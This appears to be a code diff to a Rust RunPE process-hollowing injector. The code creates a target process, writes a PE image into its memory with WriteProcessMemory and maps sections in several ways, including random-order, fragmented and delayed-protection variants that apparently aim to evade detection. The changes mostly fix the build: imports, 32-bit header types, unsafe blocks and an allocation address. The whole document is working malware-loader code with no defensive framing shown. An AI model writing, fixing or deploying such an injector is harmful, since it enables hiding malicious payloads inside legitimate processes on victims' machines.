@@ -13,19 +13,31 @@ use windows_sys::Win32::System::Threading::{
 use windows_sys::Win32::System::Memory::{
     VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
     PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
+};
+
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Diagnostics::Debug::{
     IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
 };
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Diagnostics::Debug::{
     WriteProcessMemory, ReadProcessMemory,
-    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
-    IMAGE_SECTION_HEADER,
+};
+
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER,
+};
+
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::SystemServices::{
+    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
 };
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::ProcessStatus::{
-    K32GetModuleInformation, MODULEINFO,
+    GetModuleInformation, MODULEINFO,
 };
 
 #[derive(thiserror::Error, Debug)]
@@ -124,8 +136,8 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
     
     let success = unsafe {
         CreateProcessA(
-            target_path.as_ptr(),
-            args_ptr as *mut i8,
+            target_path.as_ptr() as *const u8,
+            args_ptr as *mut u8,
             std::ptr::null(),
             std::ptr::null(),
             0,
@@ -146,9 +158,9 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
     
     let mut module_info: MODULEINFO = unsafe { std::mem::zeroed() };
     let success = unsafe {
-        K32GetModuleInformation(
+        GetModuleInformation(
             process_info.hProcess,
-            std::ptr::null_mut(),
+            0, // Use 0 instead of null_mut() for HMODULE
             &mut module_info,
             std::mem::size_of::<MODULEINFO>() as u32,
         )
@@ -174,15 +186,15 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
     }
 
     let nt_headers_offset = dos_header.e_lfanew as usize;
-    let nt_header_64 = unsafe {
-        &*(pe_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS64)
+    let nt_header_32 = unsafe {
+        &*(pe_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS32)
     };
-    if nt_header_64.Signature != IMAGE_NT_SIGNATURE {
+    if nt_header_32.Signature != IMAGE_NT_SIGNATURE {
         unsafe { TerminateProcess(process_info.hProcess, 1); }
         return Err(RunPeError::InvalidPeFormat("Invalid NT signature".into()));
     }
 
-    let opt_header = &nt_header_64.OptionalHeader;
+    let opt_header = &nt_header_32.OptionalHeader;
     let image_size = opt_header.SizeOfImage as usize;
     let entry_rva = opt_header.AddressOfEntryPoint as usize;
 
@@ -221,11 +233,11 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
         )));
     }
 
-    let num_sections = nt_header_64.FileHeader.NumberOfSections as usize;
+    let num_sections = nt_header_32.FileHeader.NumberOfSections as usize;
     let section_header_ptr = unsafe {
         pe_data.as_ptr()
             .add(nt_headers_offset)
-            .add(std::mem::size_of::<IMAGE_NT_HEADERS64>())
+            .add(std::mem::size_of::<IMAGE_NT_HEADERS32>())
     } as *const IMAGE_SECTION_HEADER;
 
     let sections = unsafe { std::slice::from_raw_parts(section_header_ptr, num_sections) };
@@ -249,7 +261,7 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
 
     for sect in sections {
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         if virt_size == 0 {
             continue;
         }
@@ -405,7 +417,7 @@ fn allocate_memory_with_padding(process_handle: isize, image_size: usize) -> Res
 
 #[cfg(target_os = "windows")]
 fn allocate_memory_reverse_order(process_handle: isize, image_size: usize) -> Result<*mut std::ffi::c_void, RunPeError> {
-    let hint_address = 0x7FFFFFFFFF0000 as *mut std::ffi::c_void;
+    let hint_address = 0x7FFF0000 as *mut std::ffi::c_void;
     
     let remote_base = unsafe {
         VirtualAllocEx(
@@ -432,7 +444,7 @@ fn map_sections_standard(
     sections: &[IMAGE_SECTION_HEADER],
 ) -> Result<(), RunPeError> {
     for sect in sections {
-        let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
+        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
         let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
         let raw_size = sect.SizeOfRawData as usize;
 
@@ -456,7 +468,7 @@ fn map_sections_standard(
         }
         
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         if virt_size == 0 {
             continue;
         }
@@ -515,7 +527,7 @@ fn map_sections_random_order(
     
     for &idx in &indices {
         let sect = &sections[idx];
-        let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
+        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
         let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
         let raw_size = sect.SizeOfRawData as usize;
 
@@ -539,7 +551,7 @@ fn map_sections_random_order(
         }
         
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         if virt_size == 0 {
             continue;
         }
@@ -585,7 +597,7 @@ fn map_sections_fragmented(
     sections: &[IMAGE_SECTION_HEADER],
 ) -> Result<(), RunPeError> {
     for sect in sections {
-        let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
+        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
         let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
         let raw_size = sect.SizeOfRawData as usize;
 
@@ -624,7 +636,7 @@ fn map_sections_fragmented(
         }
         
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         if virt_size == 0 {
             continue;
         }
@@ -670,7 +682,7 @@ fn map_sections_custom_protection(
     sections: &[IMAGE_SECTION_HEADER],
 ) -> Result<(), RunPeError> {
     for sect in sections {
-        let src_ptr = pe_data.as_ptr().add(sect.PointerToRawData as usize);
+        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
         let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
         let raw_size = sect.SizeOfRawData as usize;
 
@@ -694,7 +706,7 @@ fn map_sections_custom_protection(
         }
         
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         if virt_size == 0 {
             continue;
         }
@@ -816,7 +828,7 @@ fn map_sections_delayed_protection(
 ) -> Result<(), RunPeError> {
     for sect in sections {
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         let raw_size = sect.SizeOfRawData as usize;
         let raw_ptr = pe_data.as_ptr().wrapping_add(sect.PointerToRawData as usize);
         
@@ -847,7 +859,7 @@ fn map_sections_delayed_protection(
     
     for sect in sections {
         let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
-        let virt_size = sect.Misc.VirtualSize as usize;
+        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
         
         if virt_size == 0 {
             continue;
